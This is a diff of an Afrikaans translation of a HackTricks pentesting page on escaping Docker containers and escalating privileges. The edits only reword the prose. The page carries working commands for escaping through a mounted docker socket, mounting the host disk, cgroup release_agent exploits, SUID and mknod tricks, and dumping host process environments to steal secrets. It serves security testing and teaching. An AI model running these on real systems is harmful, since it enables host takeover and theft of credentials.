@@ -1,16 +1,16 @@
-# Docker Uitbreek / Voorregverhoging
+# Docker Breakout / Privilege Escalation
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -18,23 +18,23 @@ Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="li
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) om maklik te bou en **werkstrome outomaties** aangedryf deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
-Kry Vandaag Toegang:
+Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) om maklik te bou en **werkvloei te outomatiseer** wat deur die wêreld se **meest gevorderde** gemeenskapstoestelle aangedryf word.\
+Kry Toegang Vandag:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
-## Outomatiese Opsomming & Ontsnapping
+## Outomatiese Enumerasie & Ontsnapping
 
-* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Dit kan ook **houers opsom**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie hulpmiddel is baie **nuttig om die houer waarin jy is te opsom en selfs probeer om outomaties te ontsnap**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige hulpmiddel om die voorregte te kry wat die houer het om maniere te vind om daaruit te ontsnap
-* [**deepce**](https://github.com/stealthcopter/deepce): Hulpmiddel om te opsom en te ontsnap uit houers
-* [**grype**](https://github.com/anchore/grype): Kry die CVE's wat in die sagteware geïnstalleer in die beeld bevat
+* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Dit kan ook **hou van houers**
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie hulpmiddel is redelik **nuttig om die houer waarin jy is te hou, selfs om te probeer om outomaties te ontsnap**
+* [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige hulpmiddel om die bevoegdhede wat die houer het te kry om maniere te vind om daarvan te ontsnap
+* [**deepce**](https://github.com/stealthcopter/deepce): Hulpmiddel om te hou en te ontsnap van houers
+* [**grype**](https://github.com/anchore/grype): Kry die CVEs wat in die sagteware wat in die beeld geïnstalleer is, bevat is
 
-## Gemoniteerde Docker Sokkel Ontsnapping
+## Gemonteerde Docker Socket Ontsnapping
 
-As jy op een of ander manier vind dat die **docker-sokkel** binne die docker-houer gemoniteer is, sal jy daaruit kan ontsnap.\
-Dit gebeur gewoonlik in docker-houers wat om een ​​of ander rede moet koppel aan die docker-daemon om aksies uit te voer.
+As jy op een of ander manier vind dat die **docker socket gemonteer is** binne die docker houer, sal jy in staat wees om daarvan te ontsnap.\
+Dit gebeur gewoonlik in docker houers wat om een of ander rede met die docker daemon moet verbind om aksies uit te voer.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
@@ -55,13 +55,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-In geval die **docker sokket op 'n onverwagte plek** is, kan jy steeds daarmee kommunikeer deur die **`docker`** bevel te gebruik met die parameter **`-H unix:///path/to/docker.sock`**
+As die **docker socket in 'n onverwagte plek is**, kan jy steeds daarmee kommunikeer deur die **`docker`** opdrag met die parameter **`-H unix:///path/to/docker.sock`**
 {% endhint %}
 
-Docker daemon kan ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels, kan kommunikasie met die Docker daemon plaasvind oor die Systemd sokket `fd://`.
+Docker daemon mag ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels, kommunikasie met die Docker daemon kan plaasvind oor die Systemd socket `fd://`.
 
 {% hint style="info" %}
-Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewings:
+Boonop, let op die runtime sockets van ander hoëvlak runtimes:
 
 * dockershim: `unix:///var/run/dockershim.sock`
 * containerd: `unix:///run/containerd/containerd.sock`
@@ -71,23 +71,23 @@ Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewin
 * ...
 {% endhint %}
 
-## Misbruik van Bevoegdhede Ontsnapping
+## Vermoedens van Misbruik van Vermoëns
 
-Jy moet die bevoegdhede van die houer nagaan, as dit enige van die volgende het, kan jy dalk daaruit ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Jy moet die vermoëns van die houer nagaan, as dit enige van die volgende het, mag jy in staat wees om daaruit te ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-Jy kan tans die houer se bevoegdhede nagaan deur **voorheen genoemde outomatiese gereedskap** of te gebruik:
+Jy kan tans die vermoëns van die houer nagaan met **voorheen genoemde outomatiese gereedskap** of:
 ```bash
 capsh --print
 ```
-Op die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te misbruik om voorregte te ontsnap/te verhoog:
+In die volgende bladsy kan jy **meer leer oor linux vermoëns** en hoe om dit te misbruik om te ontsnap/te eskaleer bevoegdhede:
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Ontsnapping uit Bevoorregte Houers
+## Ontsnapping uit Bevoegde Houers
 
-'n Bevoorregte houer kan geskep word met die vlag `--privileged` of deur spesifieke verdedigings uit te skakel:
+'n Bevoegde houer kan geskep word met die vlag `--privileged` of deur spesifieke verdedigingstelsels te deaktiveer:
 
 * `--cap-add=ALL`
 * `--security-opt apparmor=unconfined`
@@ -99,44 +99,44 @@ Op die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te
 * `--cgroupns=host`
 * `Mount /dev`
 
-Die `--privileged` vlag verlaag houer-sekuriteit aansienlik, deur **ongelimiteerde toegang tot toestelle** te bied en **verskeie beskermings** te omseil. Vir 'n gedetailleerde ontleding, verwys na die dokumentasie oor die volle impakte van `--privileged`.
+Die `--privileged` vlag verlaag die sekuriteit van die houer aansienlik, wat **onbeperkte toesteltoegang** bied en **verskeie beskermings** omseil. Vir 'n gedetailleerde ontleding, verwys na die dokumentasie oor die volle impakte van `--privileged`.
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
 {% endcontent-ref %}
 
-### Bevoorregte + hostPID
+### Bevoegd + hostPID
 
-Met hierdie toestemmings kan jy net **beweeg na die namespace van 'n proses wat op die gasheer as root hardloop** soos init (pid:1) deur net te hardloop: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+Met hierdie toestemmings kan jy net **na die naamruimte van 'n proses wat in die gasheer as root loop beweeg** soos init (pid:1) deur net te loop: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
-Toets dit in 'n houer deur uit te voer:
+Toets dit in 'n houer wat uitvoer:
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
-### Bevoorreg
+### Privileged
 
-Net met die bevoorregte vlag kan jy probeer om **toegang tot die gasheer se skyf** te kry of probeer **ontsnap deur die release\_agent of ander ontsnappings te misbruik**.
+Net met die privileged-vlag kan jy probeer om die **gasheer se skyf** te **benader** of probeer om te **ontsnap deur release\_agent of ander ontsnapte** te misbruik.
 
-Toets die volgende omseilings in 'n houer uit te voer:
+Toets die volgende omseilings in 'n houer wat uitvoer:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
-#### Monteer Disk - Poc1
+#### Mounting Disk - Poc1
 
-Goed geconfigureerde docker-houers sal nie opdragte soos **fdisk -l** toelaat nie. Tog, op 'n verkeerd gekonfigureerde docker-opdrag waar die vlag `--privileged` of `--device=/dev/sda1` met kapitaliseer gespesifiseer is, is dit moontlik om die regte te kry om die gas-aandrywing te sien.
+Goed geconfigureerde docker houers sal nie opdragte soos **fdisk -l** toelaat nie. egter op verkeerd geconfigureerde docker opdragte waar die vlag `--privileged` of `--device=/dev/sda1` met hoofletters gespesifiseer is, is dit moontlik om die bevoegdhede te verkry om die gasheer skyf te sien.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-Dus, om die gasmasjien oor te neem, is dit triviaal:
+So om die gasheer masjien oor te neem, is dit triviaal:
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-En voilà! Jy kan nou toegang kry tot die lêersisteem van die gasheer omdat dit in die `/mnt/hola`-vouer gemoniteer is.
+En voilà ! Jy kan nou toegang tot die lêerstelsel van die gasheer verkry omdat dit in die `/mnt/hola` gids gemonteer is.
 
 #### Montering van Skyf - Poc2
 
-Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer-OS te verkry deur 'n skryfbare hostPath-volume wat deur die groep geskep is. Hieronder is 'n paar algemene dinge wat jy binne die houer kan nagaan om te sien of jy hierdie aanvallervektor kan benut:
+Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer OS te verkry via 'n skryfbare hostPath volume wat deur die kluster geskep is. Hieronder is 'n paar algemene dinge wat jy binne die houer kan nagaan om te sien of jy hierdie aanvallersvektor kan benut:
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -157,9 +157,9 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Bevoorregte Ontsnapping deur gebruik te maak van bestaande release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Privileged Escape Misbruik van bestaande release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
-{% code title="Aanvanklike PoC" %}
+{% code title="Begin PoC" %}
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -195,7 +195,7 @@ cat /o
 ```
 {% endcode %}
 
-#### Bevoorregte Ontsnapping deur die skepping van release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Bevoegde Ontsnapping Misbruik van geskepte release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 
 {% code title="Tweede PoC" %}
 ```bash
@@ -241,15 +241,15 @@ cat /output
 ```
 {% endcode %}
 
-Vind 'n **verduideliking van die tegniek** in:
+Vind 'n **verklaring van die tegniek** in:
 
 {% content-ref url="docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Bevoorregte Ontsnapping deur die release\_agent te misbruik sonder om die relatiewe pad te ken - PoC3
+#### Bevoorregte Ontsnapping Misbruik van release\_agent sonder om die relatiewe pad te ken - PoC3
 
-In die vorige aanvalle is die **absoluite pad van die houer binne die gasheer se lêersisteem bekendgemaak**. Dit is egter nie altyd die geval nie. In gevalle waar jy **nie die absoluite pad van die houer binne die gasheer ken nie** kan jy hierdie tegniek gebruik:
+In die vorige exploits is die **absolute pad van die houer binne die gasheer se lêerstelsel bekend gemaak**. Dit is egter nie altyd die geval nie. In gevalle waar jy **nie die absolute pad van die houer binne die gasheer ken nie**, kan jy hierdie tegniek gebruik:
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -313,7 +313,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-Die uitvoering van die PoC binne 'n bevoorregte houer behoort uitset te lewer soortgelyk aan:
+Voer die PoC binne 'n bevoorregte houer uit, dit behoort 'n uitvoer soortgelyk aan die volgende te verskaf:
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -341,32 +341,33 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Bevoorregte Ontsnapping deur Misbruik van Sensitiewe Monterings
+#### Privilege Escape Misbruik van Sensitiewe Monte
 
-Daar is verskeie lêers wat gemonteer kan word wat **inligting oor die onderliggende gasheer** gee. Sommige van hulle kan selfs **aandui dat iets deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller in staat sal stel om uit die houer te ontsnap). Die misbruik van hierdie lêers mag toelaat dat:
+Daar is verskeie lêers wat gemonteer kan wees wat **inligting oor die onderliggende gasheer** gee. Sommige van hulle kan selfs aandui **iets wat deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller sal toelaat om uit die houer te ontsnap).\
+Die misbruik van hierdie lêers kan toelaat dat:
 
-* release\_agent (reeds behandel voorheen)
+* release\_agent (alreeds voorheen behandel)
 * [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
 * [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
 * [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
 * [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
 
-Nietemin, kan jy **ander sensitiewe lêers** vind om te kontroleer op hierdie bladsy:
+U kan egter **ander sensitiewe lêers** vind om na te kyk op hierdie bladsy:
 
 {% content-ref url="sensitive-mounts.md" %}
 [sensitive-mounts.md](sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Willekeurige Monterings
+### Arbitraire Monte
 
-In verskeie gevalle sal jy vind dat die **houdster 'n volume van die gasheer gemonteer het**. As hierdie volume nie korrek geconfigureer is nie, kan jy dalk **toegang verkry/wysig tot sensitiewe data**: Lees geheime, verander ssh authorized\_keys...
+In verskeie gevalle sal u vind dat die **houer 'n volume van die gasheer gemonteer het**. As hierdie volume nie korrek gekonfigureer is nie, kan u moontlik **sensitiewe data toegang/aanpas**: Lees geheime, verander ssh authorized\_keys…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### Voorregverhoging met 2 doppe en gasheermontering
+### Privilege Escalation with 2 shells and host mount
 
-As jy toegang het as **root binne 'n houer** wat 'n paar vouers van die gasheer gemonteer het en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer** en het leestoegang oor die gemonteerde vouer.\
-Jy kan 'n **bash suid-lêer** skep in die **gemonteerde vouer** binne die **houer** en dit **uitvoer vanaf die gasheer** om voorregverhoging te bewerkstellig.
+As jy toegang het as **root binne 'n houer** wat 'n paar vouers van die gasheer gemonteer het en jy het **gevlug as 'n nie-bevoorregte gebruiker na die gasheer** en het lees toegang oor die gemonteerde vouer.\
+Jy kan 'n **bash suid-lêer** in die **gemonteerde vouer** binne die **houer** skep en dit **van die gasheer uitvoer** om privesc te verkry.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -374,14 +375,14 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### Voorregskaping met 2 doppe
+### Privilege Escalation with 2 shells
 
-Indien jy toegang het as **root binne 'n houer** en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide doppe misbruik om **voorregskaping binne die gasheer** te bewerkstellig as jy die vermoë MKNOD binne die houer het (dit is standaard) soos [**verduidelik in hierdie pos**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Met so 'n vermoë word die root-gebruiker binne die houer toegelaat om **bloktoestel-lêers te skep**. Toestellêers is spesiale lêers wat gebruik word om **onderliggende hardeware & kernelmodules te benader**. Byvoorbeeld, die /dev/sda bloktoestel-lêer gee toegang om **die rou data op die stelsel se skyf te lees**.
+As jy toegang het as **root binne 'n houer** en jy het **gevlug as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide shells misbruik om **privesc binne die gasheer** te doen as jy die vermoë MKNOD binne die houer het (dit is standaard) soos [**in hierdie pos verduidelik**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+Met so 'n vermoë mag die root-gebruiker binne die houer **bloktoestel lêers skep**. Toestel lêers is spesiale lêers wat gebruik word om **toegang te verkry tot onderliggende hardeware & kernmodules**. Byvoorbeeld, die /dev/sda bloktoestel lêer gee toegang tot **om die rou data op die stelseldisk te lees**.
 
-Docker beskerm teen misbruik van bloktoestelle binne houers deur 'n cgroup-beleid af te dwing wat **bloktoestel lees/skryf-operasies blokkeer**. Nietemin, as 'n bloktoestel binne die houer **geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/**-gids. Hierdie toegang vereis dat die **proses-eienaar dieselfde is** binne en buite die houer.
+Docker beskerm teen bloktoestel misbruik binne houers deur 'n cgroup beleid af te dwing wat **bloktoestel lees/skryf operasies blokkeer**. Nietemin, as 'n bloktoestel **binne die houer geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/** gids. Hierdie toegang vereis dat die **proses eienaar dieselfde moet wees** binne en buite die houer.
 
-**Uitbuiting** voorbeeld van hierdie [**verslag**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+**Exploitation** voorbeeld van hierdie [**skrywe**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -419,13 +420,13 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 ### hostPID
 
-As jy toegang het tot die prosesse van die gasheer, sal jy in staat wees om baie sensitiewe inligting wat in daardie prosesse gestoor word, te benader. Voer toets laboratorium uit:
+As jy toegang kan verkry tot die prosesse van die gasheer, gaan jy in staat wees om 'n baie sensitiewe inligting wat in daardie prosesse gestoor is, te bekom. Voer toetslaboratorium uit:
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Byvoorbeeld, jy sal in staat wees om die prosesse te lys deur iets soos `ps auxn` te gebruik en te soek na sensitiewe besonderhede in die opdragte.
+Byvoorbeeld, jy sal in staat wees om die prosesse te lys met iets soos `ps auxn` en soek na sensitiewe besonderhede in die opdragte.
 
-Dan, aangesien jy **toegang het tot elke proses van die gasheer in /proc/, kan jy net hul omgewingsgeheime steel** deur uit te voer:
+Dan, aangesien jy **elke proses van die gasheer in /proc/ kan toegang verkry, kan jy net hul omgewingsecrets steel** deur te loop:
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -434,7 +435,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-Jy kan ook **toegang verkry tot ander prosesse se lêerbeskrywers en hul oop lêers lees**:
+U kan ook **ander prosesse se lêerdeskriptoren toegang en hul oop lêers lees**:
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -444,82 +445,82 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-Jy kan ook **prosesse doodmaak en 'n DoS veroorsaak**.
+U kan ook **prosesse doodmaak en 'n DoS veroorsaak**.
 
 {% hint style="warning" %}
-As jy op een of ander manier bevoorregte **toegang oor 'n proses buite die houer** het, kan jy iets soos `nsenter --target <pid> --all` of `nsenter --target <pid> --mount --net --pid --cgroup` hardloop om **'n skaal met dieselfde ns-beperkings** (hopelik geen) **as daardie proses**.
+As u op een of ander manier bevoorregte **toegang oor 'n proses buite die houer** het, kan u iets soos `nsenter --target <pid> --all` of `nsenter --target <pid> --mount --net --pid --cgroup` uitvoer om **'n skulp met dieselfde ns-beperkings** (hopelik geen) **as daardie proses te loop.**
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Indien 'n houer ingestel is met die Docker [gasnetwerkbestuurder (`--network=host`)](https://docs.docker.com/network/host/), is daardie houer se netwerkstapel nie geïsoleer van die Docker-gashouer nie (die houer deel die gas se netwerk-namespace), en die houer kry nie sy eie IP-adres toegewys nie. Met ander woorde, die **houer bind alle dienste direk aan die gas se IP**. Verder kan die houer **ALLE netwerkverkeer wat die gas** stuur en ontvang op die gedeelde koppelvlak onderskep met `tcpdump -i eth0`.
+As 'n houer geconfigureer is met die Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), is daardie houer se netwerkstapel nie van die Docker-gasheer geïsoleer nie (die houer deel die gasheer se netwerknaamruimte), en die houer ontvang nie sy eie IP-adres nie. Met ander woorde, die **houer bind al die dienste direk aan die gasheer se IP**. Verder kan die houer **ALLES netwerkverkeer wat die gasheer** stuur en ontvang op die gedeelde koppelvlak `tcpdump -i eth0` onderskep.
 
-Byvoorbeeld, jy kan dit gebruik om **verkeer te snuif en selfs te vervals** tussen die gas en metadata-instansie.
+Byvoorbeeld, jy kan dit gebruik om **verkeer te snuffel en selfs te spoof** tussen die gasheer en metadata-instantie.
 
 Soos in die volgende voorbeelde:
 
-* [Verslag: Hoe om Google SRE te kontak: 'n Skulping in die wolk SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
-* [Metadata-diens MITM maak wortelprivilege-escalatie moontlik (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
+* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Jy sal ook in staat wees om **netwerkdienste wat aan die plaaslike gas** gebind is binne die gas te bereik of selfs toegang te verkry tot die **metadata-toestemmings van die node** (wat dalk verskil van dié wat 'n houer kan bereik).
+Jy sal ook in staat wees om **netwerkdienste wat aan localhost gebind is** binne die gasheer te benader of selfs toegang te verkry tot die **metadata-toestemmings van die node** (wat dalk anders kan wees as wat 'n houer kan toegang verkry).
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Met `hostIPC=true`, verkry jy toegang tot die inter-process kommunikasie (IPC) bronne van die gasheer, soos **gedeelde geheue** in `/dev/shm`. Dit maak dit moontlik om te lees/skryf waar dieselfde IPC-bronne deur ander gasheer- of houerprosesse gebruik word. Gebruik `ipcs` om hierdie IPC-meganismes verder te ondersoek.
+Met `hostIPC=true` kry jy toegang tot die gasheer se inter-proses kommunikasie (IPC) hulpbronne, soos **gedeelde geheue** in `/dev/shm`. Dit stel jou in staat om te lees/schryf waar dieselfde IPC hulpbronne deur ander gasheer of pod prosesse gebruik word. Gebruik `ipcs` om hierdie IPC meganismes verder te ondersoek.
 
-* **Ondersoek /dev/shm** - Soek na enige lêers in hierdie gedeelde geheue-plek: `ls -la /dev/shm`
-* **Ondersoek bestaande IPC-fasiliteite** - Jy kan nagaan of enige IPC-fasiliteite gebruik word met `/usr/bin/ipcs`. Kontroleer dit met: `ipcs -a`
+* **Inspecteer /dev/shm** - Soek enige lêers in hierdie gedeelde geheue ligging: `ls -la /dev/shm`
+* **Inspecteer bestaande IPC fasiliteite** – Jy kan kyk of enige IPC fasiliteite gebruik word met `/usr/bin/ipcs`. Kontroleer dit met: `ipcs -a`
 
-### Herstel vaardighede
+### Herwin vermoëns
 
-As die systaalaanroep **`unshare`** nie verbied is nie, kan jy al die vaardighede herwin deur dit uit te voer:
+As die syscall **`unshare`** nie verbied is nie, kan jy al die vermoëns herwin wat loop:
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
-### Gebruikersnaamruimte misbruik via symboliese skakel
+### Gebruik van gebruikersnaamruimte via symlink
 
-Die tweede tegniek wat verduidelik word in die pos [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) dui aan hoe jy bind mounts met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers te verwyder).
+Die tweede tegniek wat in die pos [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) verduidelik word, dui aan hoe jy bind mounts met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers te verwyder).
 
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) om maklik te bou en **werkstrome outomaties** te dryf met die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
-Kry Toegang Vandag:
+Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskapstools aangedryf word.\
+Kry Vandag Toegang:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
-## CVE's
+## CVEs
 
-### Runc uitbuiting (CVE-2019-5736)
+### Runc exploit (CVE-2019-5736)
 
-In die geval dat jy `docker exec` as root kan uitvoer (waarskynlik met sudo), kan jy probeer om voorregte te eskaleer deur te ontsnap uit 'n houer wat misbruik maak van CVE-2019-5736 (uitbuiting [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre lêer van die **gasheer** **oorvryf vanuit 'n houer**, sodat enigeen wat `docker exec` uitvoer die lading kan aktiveer.
+In die geval dat jy `docker exec` as root kan uitvoer (waarskynlik met sudo), probeer om voorregte te verhoog deur uit 'n houer te ontsnap deur CVE-2019-5736 te misbruik (exploit [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre van die **gasheer** **uit 'n houer** **oorskryf**, sodat enigeen wat docker exec uitvoer die payload kan aktiveer.
 
-Verander die lading dienooreenkomstig en bou die main.go met `go build main.go`. Die resulterende binêre lêer moet in die docker-houer geplaas word vir uitvoering.\
-Met uitvoering, sodra dit `[+] Oorvryf /bin/sh suksesvol` vertoon, moet jy die volgende vanaf die gasheer-rekenaar uitvoer:
+Verander die payload dienooreenkomstig en bou die main.go met `go build main.go`. Die resulterende binêre moet in die docker houer geplaas word vir uitvoering.\
